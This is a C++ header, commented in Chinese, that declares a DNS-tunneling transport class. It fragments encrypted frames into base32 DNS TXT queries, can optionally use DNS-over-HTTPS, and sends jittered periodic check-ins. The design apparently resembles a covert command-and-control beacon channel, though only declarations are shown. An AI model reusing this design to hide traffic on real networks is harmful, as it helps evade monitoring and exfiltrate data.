// Core/Comms/Transports/Dns/DnsTransport.hpp
//   上行: Send(frame) = 加密 + DatagramCodec 分片(≤110B) 入队(带会话身份戳
//         + 盲重传额度); Recv() 每拍发一片, 交互成功才消耗重传额度, 失败回队首。
//   下行: Recv() = 节流(check-in)后发起一次 TXT 查询(带一片上行或空拉取),
//         响应 TXT(≤255B/条) -> 重组 -> 解密 -> 完整帧。
//   查询形态: 自组 DNS 报文(不经系统 resolver, 完全控制形态/频率):
//     qname = <sid-segseq-fragidx-fragtotal>.<base32(分片)分标签>.<domain>, 类型 TXT。
//   DoH 模式(): cfg.doh_url / 编译期 CLEAT_DNS_DOH_URL 非空时, 同一 wire
//     查询装进 RFC8484 POST(响应体 = wire 应答), UDP 路径停用, 线格式零变化。
//   socket 保活: Disconnect 不关 UDP socket(源端口 = 服务端 peer 身份), 析构才收。
// 安全: 分片载荷为 Encrypt(frame)(AEAD+PSK), 伪造源/篡改在解密层被拒。
// 低带宽通道: IsLowBandwidth()=true(由 selector 按 Type 判定)。
#pragma once

#include <atomic>
#include <cstdint>
#include <deque>
#include <memory>
#include <mutex>
#include <string>
#include <vector>

#include "Core/Comms/Platform/INetworkOps.hpp"
#include "Core/Comms/Platform/IHttpOps.hpp"
#include "Core/Comms/Transports/ITransport.hpp"
#include "Core/Comms/Transports/Internal/PollClock.hpp"
#include "Core/Comms/Session/HeartbeatPolicy.hpp"
#include "Core/Comms/Transports/Internal/DatagramCodec.hpp"

namespace cleat {

	class DnsTransport : public ITransport {
	public:
		/// doh_http: DoH 模式的 HTTP 事务通道(测试注入用; 缺省 = DoH 首用时
		/// 经 CreateHttpOps() 惰性创建, UDP 模式不创建)。
		explicit DnsTransport(INetworkOps& ops,
			std::unique_ptr<IHttpOps> doh_http = nullptr);
		~DnsTransport() override;

		DnsTransport(const DnsTransport&) = delete;
		DnsTransport& operator=(const DnsTransport&) = delete;
		DnsTransport(DnsTransport&&) = delete;
		DnsTransport& operator=(DnsTransport&&) = delete;

		bool Connect(const TransportConfig& cfg) override;
		void Disconnect() override;
				bool IsConnected() const override;
		
		/**
		 * @brief 通道健康档
		 * @details Dead <=> `connected_ == false`(B.1 原则 2); Degraded 由今天"不判死"的
		 */
		ChannelHealth HealthNow() const override;
		bool Send(const std::vector<uint8_t>& frame) override;
		/**
		 * @brief 覆写 ITransport 默认映射: 结构性超限报 `Dropped`
		 * @details 整帧分片超 255(见 `Send`)是**永久**失败, 重试永远不会成功。
		 *          默认映射统一报 `Rejected`(可重试) → `OutboundSink` 把该帧回插队首,
		 *          此后每轮 Flush 都卡在同一帧, 队首阻塞静默瘫痪整条出站(含心跳)。
		 *          故此处如实升级: 结构性超限 → `Dropped`(已消费, 队列继续流动);
		 *          其余 false(上行队列余量不足等)确属可重试, 维持 `Rejected`。
		 *          两者都**不**是 `ChannelFailure`(C5 硬约束不受影响)。
		 */
		SendResult Write(const std::vector<uint8_t>& frame) override;
		bool Recv(std::vector<uint8_t>& frame, int timeout_ms) override;
		///  取走并复位上行积压统计(自上次调用以来的增量)
		ChannelOverflowStats TakeOverflowStats() override;

		TransportType Type() const override { return TransportType::Dns; }

		/// v1.5 节奏合一(设计): 距下一次 check-in 到期, 空闲档为准 ——
		/// 快速档(未注册/上行积压)条件与掩码前提互斥(判定层已拒), 不参与窗长推导。
		uint32_t NextPollDueInMs() const override { return slow_clock_.NextDueInMs(); }

		/// v1.5 收尾(稳态掩码门): 待落线上行分片字节 —— sink 排空 ≠ 干完,
		/// 分片要多次 Recv 才逐片落线, 未排空不进窗。
		uint32_t PendingUplinkBytes() const override {
			std::lock_guard<std::mutex> lock(mutex_);
			uint64_t bytes = 0;
			for (const QueuedFrag& f : up_frags_) {
				bytes += f.frag.size();
			}
			return static_cast<uint32_t>(bytes > UINT32_MAX ? UINT32_MAX : bytes);
		}
		int Priority() const override { return 2; }   // 降级链: TCP/HTTPS 之后
		void Reset() override;

	private:
		// 一次交互: 查询(带一片上行数据或空) -> TXT 响应(下行分片或空)
		// 返回 true 表示交互成功(可能无下行数据)
		bool exchange(const std::vector<uint8_t>& up_frag, std::vector<uint8_t>& down_frag);
		std::vector<uint8_t> build_query(uint16_t id, const std::string& qname) const;
		// 解析 DNS 响应, 提取全部 TXT RDATA 拼接; 失败返回 false
		bool parse_txt_response(const std::vector<uint8_t>& resp,
			const std::vector<uint8_t>& query, std::vector<uint8_t>& txt) const;
		std::string build_qname(const std::vector<uint8_t>& frag) const;

		INetworkOps& ops_;
		TransportConfig cfg_;
		std::atomic<bool> connected_{ false };
		
				/// Degraded 信号位
		std::atomic<bool> degraded_{ false };
		void MarkDegraded(const char* why);
		
		/// N23: 连续下行解密失败熔断 —— 阈值按通道定值
		/// (低带宽通道走 UDP, 偶发损坏/伪造概率高于 TLS 承载的 HTTPS, 故容错度更高)
		static constexpr int kDecryptFailThreshold = 5;
		int decrypt_fail_streak_ = 0;
		void NoteDecryptFailure();   ///< 记一次失败: Degraded, 达阈值判 Dead
		void NoteDecryptSuccess();   ///< 解密成功: 清零并清除 Degraded

		void ClearDegraded() { degraded_.store(false); }
		mutable std::mutex mutex_;   // mutable: PendingUplinkBytes() const 需持锁只读
		HeartbeatPolicy clock_policy_;     // 唯一抖动模型(节拍合一 A1.5)
		PollClock slow_clock_{ clock_policy_, 1000 };   // 空闲 check-in(心跳节奏, 正态/均匀+丢拍)
		PollClock fast_clock_{ clock_policy_, 1000 };   // 有上行数据/未注册时: 1s 快速交互(固定, 不抖不丢)

		INetworkOps::SocketHandle udp_sock_ = -1;
		std::string dns_host_;          // cfg.dns_server 拆分: host
		uint16_t    dns_port_ = 53;

		// 装 HTTP body, 响应体 = DNS wire 应答), UDP 路径停用; 线格式零变化,
		// 服务端权威 DNS 无感。取值: cfg.doh_url → 编译期 CLEAT_DNS_DOH_URL 兜底。
		std::string doh_url_;
		std::unique_ptr<IHttpOps> doh_http_;

		/// sid 用于跨链路失效判定 —— Disconnect 不再无条件清空待发队列
		/// :
		/// 以"发送时校验 sid"代替"关闭即作废" —— 会话没变, 原片原序跨重连
		/// 续发; 会话变了, 残片就地丢弃, 陈旧数据永不落线( 的意图由更
		/// 精确的分片级防护承接, 而不是整队清空)。
		struct QueuedFrag {
			std::vector<uint8_t> frag;
			uint64_t sid = 0;
			/// 上行可靠性 —— 服务端重组器按 idx 去重, 重复片幂等。
			int sends_left = 0;
		};
		std::deque<QueuedFrag> up_frags_;
		/// 本次 Send 是否因**结构性超限**(整帧 > 255 片)失败 —— Write 据此把
		/// "永久发不出"如实报为 Dropped 而非 Rejected(见 Write 注)。Send 入口复位,
		/// 原子避免 Write 读侧与其它线程 Send 写侧构成 UB(误归属窗口由上层 Flush 串行化兜住)。
		std::atomic<bool> send_structural_{ false };
		ChannelOverflowStats overflow_;   ///<  溢出聚合(取走后复位)   // 上行分片队列(有界)
		DatagramCodec::Reassembler reassembler_;
		std::vector<uint8_t> pending_frame_;   // 探活/交互返回的完整帧缓存(待上层消费)
		uint16_t next_id_ = 0x1357;     // DNS 事务 ID(递增)
	};

	// 工厂(声明见 ITransport.hpp)
	std::unique_ptr<ITransport> CreateDnsTransport(INetworkOps& ops);

} // namespace cleat
